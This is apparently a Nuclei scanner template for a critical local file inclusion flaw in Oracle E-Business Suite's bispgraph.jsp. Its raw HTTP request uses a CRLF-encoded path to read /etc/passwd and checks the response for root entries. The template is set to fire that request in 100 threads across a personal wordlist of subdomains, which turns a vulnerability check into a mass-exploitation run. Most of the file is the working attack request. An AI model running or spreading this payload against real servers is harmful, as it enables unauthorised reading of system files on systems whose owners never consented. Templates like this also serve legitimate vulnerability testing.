id: oracle-ebs-bispgrapgh-file-read 1
info:
  author: emenalf,tirtha_mandal,thomas_from_offensity
  name: Oracle EBS Bispgraph File Access
  reference: '- https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf

    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf

    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf

    '
  severity: critical
  tags: oracle,lfi
requests:
- attack: sniper
  matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/ HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
    Firefox/65.0

    Connection: close

    Accept: */*

    Accept-Language: en

    Accept-Encoding: gzip

    '
  threads: 100
